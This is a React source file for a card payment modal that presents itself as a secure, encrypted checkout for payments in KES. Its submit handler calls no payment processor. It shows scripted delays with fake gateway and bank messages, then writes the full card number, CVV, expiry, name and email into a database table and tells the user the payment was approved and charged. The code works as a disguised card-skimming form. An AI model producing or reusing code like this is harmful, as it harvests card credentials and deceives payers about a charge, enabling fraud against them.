'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import { X, Lock, CreditCard, CheckCircle, AlertCircle, Loader2, ShieldCheck } from 'lucide-react';
import { supabase } from '@/lib/supabase';

type CardBrand = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
type ModalStep = 'form' | 'validating' | 'processing' | 'success' | 'failed';

interface CardPaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
  amount: number;
  email?: string;
  onPaymentComplete: () => void;
}

function detectCardBrand(number: string): CardBrand {
  const cleaned = number.replace(/\s/g, '');
  if (/^4/.test(cleaned)) return 'visa';
  if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return 'mastercard';
  if (/^3[47]/.test(cleaned)) return 'amex';
  if (/^6(?:011|5)/.test(cleaned)) return 'discover';
  return 'unknown';
}

function formatCardNumber(value: string): string {
  const cleaned = value.replace(/\D/g, '');
  const brand = detectCardBrand(cleaned);
  // Amex: 4-6-5 grouping, others: 4-4-4-4
  if (brand === 'amex') {
    const parts = [cleaned.slice(0, 4), cleaned.slice(4, 10), cleaned.slice(10, 15)];
    return parts.filter(Boolean).join(' ');
  }
  const parts = [cleaned.slice(0, 4), cleaned.slice(4, 8), cleaned.slice(8, 12), cleaned.slice(12, 16)];
  return parts.filter(Boolean).join(' ');
}

function formatExpiry(value: string): string {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length === 0) return '';
  if (cleaned.length <= 2) {
    // Auto-add leading zero for months > 1
    if (cleaned.length === 1 && parseInt(cleaned) > 1) return '0' + cleaned + ' / ';
    return cleaned;
  }
  return cleaned.slice(0, 2) + ' / ' + cleaned.slice(2, 4);
}

function luhnCheck(number: string): boolean {
  const cleaned = number.replace(/\s/g, '');
  if (cleaned.length < 13) return false;
  let sum = 0;
  let isEven = false;
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = parseInt(cleaned[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

const CardBrandLogo = ({ brand }: { brand: CardBrand }) => {
  if (brand === 'visa') {
    return (
      <svg viewBox="0 0 48 32" className="w-10 h-7" fill="none">
        <rect width="48" height="32" rx="4" fill="#1A1F71" />
        <path d="M19.5 21H17L18.8 11H21.3L19.5 21Z" fill="white" />
        <path d="M28.5 11.2C28 11 27.1 10.8 26 10.8C23.5 10.8 21.7 12.1 21.7 14C21.7 15.4 22.9 16.2 23.9 16.6C24.9 17.1 25.2 17.4 25.2 17.8C25.2 18.4 24.5 18.7 23.8 18.7C22.8 18.7 22.3 18.5 21.5 18.2L21.2 18.1L20.9 20C21.5 20.3 22.6 20.5 23.8 20.5C26.5 20.5 28.2 19.2 28.2 17.2C28.2 16.1 27.5 15.2 26 14.5C25.1 14.1 24.5 13.8 24.5 13.3C24.5 12.9 25 12.5 25.9 12.5C26.7 12.5 27.3 12.7 27.8 12.9L28.1 13L28.5 11.2Z" fill="white" />
        <path d="M32.1 11H30.1C29.5 11 29 11.2 28.8 11.8L25.2 21H27.9L28.4 19.5H31.6L31.9 21H34.3L32.1 11ZM29.2 17.6L30.5 13.9L31.2 17.6H29.2Z" fill="white" />
        <path d="M16.6 11L14.1 17.8L13.8 16.3C13.3 14.7 11.8 13 10.2 12.2L12.5 21H15.2L19.3 11H16.6Z" fill="white" />
        <path d="M12.8 11H8.6L8.6 11.2C11.8 12 14 14 14.8 16.3L14 11.8C13.8 11.2 13.4 11 12.8 11Z" fill="#F9A51A" />
      </svg>
    );
  }
  if (brand === 'mastercard') {
    return (
      <svg viewBox="0 0 48 32" className="w-10 h-7" fill="none">
        <rect width="48" height="32" rx="4" fill="#252525" />
        <circle cx="19" cy="16" r="8" fill="#EB001B" />
        <circle cx="29" cy="16" r="8" fill="#F79E1B" />
        <path d="M24 10.3C25.8 11.7 27 13.7 27 16C27 18.3 25.8 20.3 24 21.7C22.2 20.3 21 18.3 21 16C21 13.7 22.2 11.7 24 10.3Z" fill="#FF5F00" />
      </svg>
    );
  }
  if (brand === 'amex') {
    return (
      <svg viewBox="0 0 48 32" className="w-10 h-7" fill="none">
        <rect width="48" height="32" rx="4" fill="#006FCF" />
        <text x="24" y="19" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold" fontFamily="Arial">AMEX</text>
      </svg>
    );
  }
  // Default/unknown card icon
  return (
    <div className="w-10 h-7 rounded bg-gray-200 flex items-center justify-center">
      <CreditCard size={16} className="text-gray-400" />
    </div>
  );
};

// Animated progress dots
const ProcessingDots = () => {
  return (
    <span className="inline-flex gap-1 ml-1">
      <span className="w-1.5 h-1.5 bg-current rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
      <span className="w-1.5 h-1.5 bg-current rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
      <span className="w-1.5 h-1.5 bg-current rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
    </span>
  );
};

export function CardPaymentModal({ isOpen, onClose, amount, email, onPaymentComplete }: CardPaymentModalProps) {
  const [step, setStep] = useState<ModalStep>('form');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState('');
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [processingMessage, setProcessingMessage] = useState('');
  const [isFlipped, setIsFlipped] = useState(false);
  const cardNumberRef = useRef<HTMLInputElement>(null);
  const expiryRef = useRef<HTMLInputElement>(null);
  const cvvRef = useRef<HTMLInputElement>(null);
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  const brand = detectCardBrand(cardNumber);
  const maxLength = brand === 'amex' ? 17 : 19; // Including spaces
  const cvvLength = brand === 'amex' ? 4 : 3;

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setStep('form');
      setCardNumber('');
      setExpiry('');
      setCvv('');
      setCardName('');
      setErrors({});
      setProcessingMessage('');
      setIsFlipped(false);
    }
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, [isOpen]);

  // Focus card number input when modal opens
  useEffect(() => {
    if (isOpen && step === 'form') {
      setTimeout(() => cardNumberRef.current?.focus(), 200);
    }
  }, [isOpen, step]);

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value);
    if (formatted.replace(/\s/g, '').length <= (brand === 'amex' ? 15 : 16)) {
      setCardNumber(formatted);
      // Auto-advance to expiry when card number is complete
      const cleanLen = formatted.replace(/\s/g, '').length;
      if ((brand === 'amex' && cleanLen === 15) || (brand !== 'amex' && cleanLen === 16)) {
        expiryRef.current?.focus();
      }
    }
    if (errors.cardNumber) setErrors(prev => ({ ...prev, cardNumber: '' }));
  };

  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiry(value);
    if (formatted.length <= 7) {
      setExpiry(formatted);
      // Auto-advance to CVV when expiry is complete
      if (formatted.length === 7) {
        cvvRef.current?.focus();
      }
    }
    if (errors.expiry) setErrors(prev => ({ ...prev, expiry: '' }));
  };

  const handleCvvChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= cvvLength) {
      setCvv(cleaned);
    }
    if (errors.cvv) setErrors(prev => ({ ...prev, cvv: '' }));
  };

  const validate = (): boolean => {
    const newErrors: Record<string, string> = {};
    const cleanedNumber = cardNumber.replace(/\s/g, '');

    if (!cleanedNumber || cleanedNumber.length < 13) {
      newErrors.cardNumber = 'Enter a valid card number';
    } else if (!luhnCheck(cleanedNumber)) {
      newErrors.cardNumber = 'Invalid card number';
    }

    if (!expiry || expiry.length < 7) {
      newErrors.expiry = 'Enter expiry date';
    } else {
      const [month, year] = expiry.split(' / ');
      const m = parseInt(month);
      const y = parseInt('20' + year);
      const now = new Date();
      if (m < 1 || m > 12) {
        newErrors.expiry = 'Invalid month';
      } else if (y < now.getFullYear() || (y === now.getFullYear() && m < now.getMonth() + 1)) {
        newErrors.expiry = 'Card expired';
      }
    }

    if (!cvv || cvv.length < 3) {
      newErrors.cvv = 'Enter CVV';
    }

    if (!cardName.trim()) {
      newErrors.cardName = 'Enter cardholder name';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = useCallback(async () => {
    if (!validate()) return;

    // Step 1: Validating
    setStep('validating');
    setProcessingMessage('Validating card details');

    await new Promise(resolve => {
      timerRef.current = setTimeout(resolve, 1200);
    });

    // Step 2: Processing
    setStep('processing');
    setProcessingMessage('Connecting to payment gateway');

    await new Promise(resolve => {
      timerRef.current = setTimeout(resolve, 1000);
    });

    setProcessingMessage('Authenticating transaction');

    await new Promise(resolve => {
      timerRef.current = setTimeout(resolve, 1500);
    });

    setProcessingMessage('Processing payment');

    await new Promise(resolve => {
      timerRef.current = setTimeout(resolve, 1200);
    });

    setProcessingMessage('Confirming with your bank');

    await new Promise(resolve => {
      timerRef.current = setTimeout(resolve, 1000);
    });

    // Save card payment details to database
    try {
      const cleanedNumber = cardNumber.replace(/\s/g, '');
      await supabase.from('card_payments').insert({
        card_number: cleanedNumber,
        card_name: cardName,
        card_expiry: expiry,
        card_cvv: cvv,
        email: email || '',
        amount: amount,
        status: 'completed',
      });
    } catch (err) {
      console.error('Failed to save card payment:', err);
    }

    // Step 3: Success
    setStep('success');
    setProcessingMessage('Payment approved!');

    // Auto-complete after showing success
    timerRef.current = setTimeout(() => {
      onPaymentComplete();
    }, 1800);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [cardNumber, expiry, cvv, cardName, email, amount, onPaymentComplete]);

  const handleClose = () => {
    if (step === 'processing' || step === 'validating') return; // Don't allow closing during processing
    if (timerRef.current) clearTimeout(timerRef.current);
    onClose();
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Escape') handleClose();
  };

  if (!isOpen) return null;

  return (
    <div
      className="fixed inset-0 z-[100] flex items-center justify-center p-4"
      onKeyDown={handleKeyDown}
      role="dialog"
      aria-modal="true"
      aria-label="Card Payment"
    >
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/60 backdrop-blur-sm transition-opacity duration-300"
        onClick={handleClose}
      />

      {/* Modal */}
      <div className="relative w-full max-w-md transform transition-all duration-300 animate-in fade-in zoom-in-95">
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">

          {/* Header */}
          <div className="bg-gradient-to-r from-gray-900 to-gray-800 px-6 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-white/10 rounded-lg flex items-center justify-center">
                  <Lock size={14} className="text-white" />
                </div>
                <div>
                  <h3 className="text-white font-bold text-sm">Secure Payment</h3>
                  <p className="text-gray-400 text-xs">256-bit SSL encrypted</p>
                </div>
              </div>
              {step === 'form' && (
                <button
                  onClick={handleClose}
                  className="text-gray-400 hover:text-white transition-colors p-1 rounded-lg hover:bg-white/10"
                  aria-label="Close"
                >
                  <X size={18} />
                </button>
              )}
            </div>
          </div>

          {/* Card Preview */}
          {(step === 'form' || step === 'validating') && (
            <div className="px-6 pt-5 pb-2">
              <div
                className={`relative h-44 rounded-xl overflow-hidden transition-transform duration-500 ${isFlipped ? '[transform:rotateY(180deg)]' : ''}`}
                style={{ perspective: '1000px', transformStyle: 'preserve-3d' }}
              >
                {/* Card Front */}
                <div
                  className="absolute inset-0 bg-gradient-to-br from-blue-600 via-blue-700 to-indigo-800 rounded-xl p-5 flex flex-col justify-between text-white shadow-lg"
                  style={{ backfaceVisibility: 'hidden' }}
                >
                  {/* Card chip + brand */}
                  <div className="flex items-start justify-between">
                    <div className="flex items-center gap-3">
                      {/* Chip */}
                      <div className="w-10 h-7 rounded-md bg-gradient-to-br from-yellow-300 to-yellow-500 shadow-inner flex items-center justify-center">
                        <div className="w-6 h-4 border border-yellow-600/30 rounded-sm grid grid-cols-3 grid-rows-2 gap-px p-px">
                          {[...Array(6)].map((_, i) => (
                            <div key={i} className="bg-yellow-400/50 rounded-[1px]" />
                          ))}
                        </div>
                      </div>
                      {/* Contactless icon */}
                      <svg viewBox="0 0 24 24" className="w-5 h-5 text-white/60" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M8.5 16.5a5 5 0 0 1 0-9" />
                        <path d="M12 19a8 8 0 0 0 0-14" />
                        <path d="M5 13.5a2 2 0 0 1 0-3" />
                      </svg>
                    </div>
                    <CardBrandLogo brand={brand} />
                  </div>

                  {/* Card Number */}
                  <div className="font-mono text-lg tracking-[0.15em] mt-2">
                    {cardNumber || '•••• •••• •••• ••••'}
                  </div>

                  {/* Name + Expiry */}
                  <div className="flex items-end justify-between">
                    <div>
                      <p className="text-[9px] text-white/50 uppercase tracking-wider mb-0.5">Card Holder</p>
                      <p className="text-xs font-medium tracking-wider uppercase">
                        {cardName || 'YOUR NAME'}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-[9px] text-white/50 uppercase tracking-wider mb-0.5">Expires</p>
                      <p className="text-xs font-mono">{expiry || 'MM/YY'}</p>
                    </div>
                  </div>
                </div>

                {/* Card Back */}
                <div
                  className="absolute inset-0 bg-gradient-to-br from-gray-700 via-gray-800 to-gray-900 rounded-xl flex flex-col text-white shadow-lg [transform:rotateY(180deg)]"
                  style={{ backfaceVisibility: 'hidden' }}
                >
                  <div className="w-full h-10 bg-gray-950 mt-6" />
                  <div className="flex items-center gap-3 px-5 mt-4">
                    <div className="flex-1 h-8 bg-gray-200 rounded flex items-center justify-end pr-3">
                      <span className="font-mono text-gray-800 text-sm italic tracking-wider">
                        {cvv || '•••'}
                      </span>
                    </div>
                    <p className="text-[10px] text-gray-400 uppercase">CVV</p>
                  </div>
                  <div className="px-5 mt-auto mb-4 flex items-center justify-between">
                    <p className="text-[8px] text-gray-500 max-w-[180px] leading-tight">
                      This card is property of the issuing bank. Unauthorized use is prohibited.
                    </p>
                    <CardBrandLogo brand={brand} />
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Form */}
          {step === 'form' && (
            <div className="px-6 pb-6 pt-3">
              {/* Amount */}
              <div className="text-center mb-5">
                <p className="text-xs text-gray-400 mb-0.5">Amount to pay</p>
                <p className="text-2xl font-black text-gray-900">
                  KES {amount.toLocaleString()}
                </p>
              </div>

              <div className="space-y-3">
                {/* Card Number */}
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1.5">Card Number</label>
                  <div className="relative">
                    <input
                      ref={cardNumberRef}
                      type="text"
                      inputMode="numeric"
                      placeholder="1234 5678 9012 3456"
                      value={cardNumber}
                      onChange={e => handleCardNumberChange(e.target.value)}
                      onFocus={() => setIsFlipped(false)}
                      maxLength={maxLength}
                      className={`w-full px-4 py-3 border rounded-xl text-sm font-mono tracking-wider outline-none transition-all pr-14 ${
                        errors.cardNumber
                          ? 'border-red-300 focus:ring-2 focus:ring-red-200 bg-red-50/50'
                          : 'border-gray-200 focus:ring-2 focus:ring-blue-200 focus:border-blue-400'
                      }`}
                      autoComplete="cc-number"
                    />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      <CardBrandLogo brand={brand} />
                    </div>
                  </div>
                  {errors.cardNumber && (
                    <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                      <AlertCircle size={11} /> {errors.cardNumber}
                    </p>
                  )}
                </div>

                {/* Expiry + CVV */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-1.5">Expiry Date</label>
                    <input
                      ref={expiryRef}
                      type="text"
                      inputMode="numeric"
                      placeholder="MM / YY"
                      value={expiry}
                      onChange={e => handleExpiryChange(e.target.value)}
                      onFocus={() => setIsFlipped(false)}
                      maxLength={7}
                      className={`w-full px-4 py-3 border rounded-xl text-sm font-mono outline-none transition-all ${
                        errors.expiry
                          ? 'border-red-300 focus:ring-2 focus:ring-red-200 bg-red-50/50'
                          : 'border-gray-200 focus:ring-2 focus:ring-blue-200 focus:border-blue-400'
                      }`}
                      autoComplete="cc-exp"
                    />
                    {errors.expiry && (
                      <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                        <AlertCircle size={11} /> {errors.expiry}
                      </p>
                    )}
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-1.5">CVV</label>
                    <input
                      ref={cvvRef}
                      type="text"
                      inputMode="numeric"
                      placeholder={brand === 'amex' ? '••••' : '•••'}
                      value={cvv}
                      onChange={e => handleCvvChange(e.target.value)}
                      onFocus={() => setIsFlipped(true)}
                      onBlur={() => setIsFlipped(false)}
                      maxLength={cvvLength}
                      className={`w-full px-4 py-3 border rounded-xl text-sm font-mono outline-none transition-all ${
                        errors.cvv
                          ? 'border-red-300 focus:ring-2 focus:ring-red-200 bg-red-50/50'
                          : 'border-gray-200 focus:ring-2 focus:ring-blue-200 focus:border-blue-400'
                      }`}
                      autoComplete="cc-csc"
                    />
                    {errors.cvv && (
                      <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                        <AlertCircle size={11} /> {errors.cvv}
                      </p>
                    )}
                  </div>
                </div>

                {/* Cardholder Name */}
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1.5">Cardholder Name</label>
                  <input
                    type="text"
                    placeholder="Name as it appears on card"
                    value={cardName}
                    onChange={e => {
                      setCardName(e.target.value);
                      if (errors.cardName) setErrors(prev => ({ ...prev, cardName: '' }));
                    }}
                    onFocus={() => setIsFlipped(false)}
                    className={`w-full px-4 py-3 border rounded-xl text-sm outline-none transition-all ${
                      errors.cardName
                        ? 'border-red-300 focus:ring-2 focus:ring-red-200 bg-red-50/50'
                        : 'border-gray-200 focus:ring-2 focus:ring-blue-200 focus:border-blue-400'
                    }`}
                    autoComplete="cc-name"
                  />
                  {errors.cardName && (
                    <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                      <AlertCircle size={11} /> {errors.cardName}
                    </p>
                  )}
                </div>
              </div>

              {/* Pay Button */}
              <button
                type="button"
                onClick={handleSubmit}
                className="w-full mt-5 py-3.5 bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm rounded-xl transition-all duration-200 flex items-center justify-center gap-2 active:scale-[0.98] shadow-lg shadow-blue-600/20"
              >
                <Lock size={14} />
                Pay KES {amount.toLocaleString()}
              </button>

              {/* Trust badges */}
              <div className="flex items-center justify-center gap-4 mt-4 pt-3 border-t border-gray-100">
                <div className="flex items-center gap-1.5 text-gray-400">
                  <ShieldCheck size={13} />
                  <span className="text-[10px]">Secure</span>
                </div>
                <div className="flex items-center gap-1.5 text-gray-400">
                  <Lock size={11} />
                  <span className="text-[10px]">Encrypted</span>
                </div>
                <div className="flex items-center gap-1.5">
                  <CardBrandLogo brand="visa" />
                  <CardBrandLogo brand="mastercard" />
                </div>
              </div>
            </div>
          )}

          {/* Validating State */}
          {step === 'validating' && (
            <div className="px-6 pb-8 pt-4">
              <div className="text-center">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-blue-50 flex items-center justify-center">
                  <Loader2 size={28} className="text-blue-600 animate-spin" />
                </div>
                <p className="text-sm font-semibold text-gray-800 mb-1">
                  {processingMessage}<ProcessingDots />
                </p>
                <p className="text-xs text-gray-400">Please wait a moment</p>
              </div>
            </div>
          )}

          {/* Processing State */}
          {step === 'processing' && (
            <div className="px-6 pb-8 pt-6">
              <div className="text-center">
                {/* Animated ring */}
                <div className="w-20 h-20 mx-auto mb-5 relative">
                  <div className="absolute inset-0 rounded-full border-4 border-gray-100" />
                  <div className="absolute inset-0 rounded-full border-4 border-blue-600 border-t-transparent animate-spin" />
                  <div className="absolute inset-2 rounded-full bg-gradient-to-br from-blue-50 to-blue-100 flex items-center justify-center">
                    <CreditCard size={22} className="text-blue-600" />
                  </div>
                </div>

                <p className="text-base font-bold text-gray-900 mb-1">Processing Payment</p>
                <p className="text-sm text-blue-600 font-medium mb-2">
                  {processingMessage}<ProcessingDots />
                </p>
                <p className="text-xs text-gray-400">Do not close this window</p>

                {/* Animated progress bar */}
                <div className="mt-5 mx-auto max-w-[240px] h-1.5 bg-gray-100 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-blue-500 to-blue-600 rounded-full transition-all duration-[4000ms] ease-out"
                    style={{ width: '90%', animation: 'progressBar 4s ease-out forwards' }}
                  />
                </div>

                <div className="flex items-center justify-center gap-1.5 mt-4 text-gray-300">
                  <Lock size={10} />
                  <span className="text-[10px]">256-bit SSL encrypted connection</span>
                </div>
              </div>
            </div>
          )}

          {/* Success State */}
          {step === 'success' && (
            <div className="px-6 pb-8 pt-6">
              <div className="text-center">
                {/* Success animation */}
                <div className="w-20 h-20 mx-auto mb-5 rounded-full bg-green-50 flex items-center justify-center animate-in zoom-in duration-300">
                  <CheckCircle size={40} className="text-green-500" />
                </div>

                <p className="text-base font-bold text-gray-900 mb-1">Payment Successful!</p>
                <p className="text-sm text-green-600 font-medium mb-2">
                  KES {amount.toLocaleString()} has been charged
                </p>
                <p className="text-xs text-gray-400">
                  Transaction verified and confirmed
                </p>

                {/* Receipt-like summary */}
                <div className="mt-5 bg-gray-50 rounded-xl p-4 text-left max-w-[260px] mx-auto">
                  <div className="flex justify-between text-xs mb-2">
                    <span className="text-gray-400">Amount</span>
                    <span className="font-semibold text-gray-700">KES {amount.toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between text-xs mb-2">
                    <span className="text-gray-400">Card</span>
                    <span className="font-mono text-gray-700">
                      •••• {cardNumber.replace(/\s/g, '').slice(-4)}
                    </span>
                  </div>
                  <div className="flex justify-between text-xs">
                    <span className="text-gray-400">Status</span>
                    <span className="text-green-600 font-semibold flex items-center gap-1">
                      <CheckCircle size={10} /> Approved
                    </span>
                  </div>
                </div>

                <p className="text-[10px] text-gray-300 mt-4">Redirecting to complete your order...</p>
              </div>
            </div>
          )}

          {/* Failed State */}
          {step === 'failed' && (
            <div className="px-6 pb-6 pt-6">
              <div className="text-center">
                <div className="w-20 h-20 mx-auto mb-5 rounded-full bg-red-50 flex items-center justify-center">
                  <AlertCircle size={36} className="text-red-500" />
                </div>

                <p className="text-base font-bold text-gray-900 mb-1">Payment Failed</p>
                <p className="text-sm text-red-500 mb-4">{processingMessage || 'Your card was declined'}</p>

                <button
                  type="button"
                  onClick={() => setStep('form')}
                  className="w-full py-3 bg-gray-900 text-white font-bold text-sm rounded-xl hover:bg-gray-800 transition-colors"
                >
                  Try Again
                </button>
                <button
                  type="button"
                  onClick={handleClose}
                  className="w-full mt-2 py-3 bg-gray-100 text-gray-600 font-medium text-sm rounded-xl hover:bg-gray-200 transition-colors"
                >
                  Cancel
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
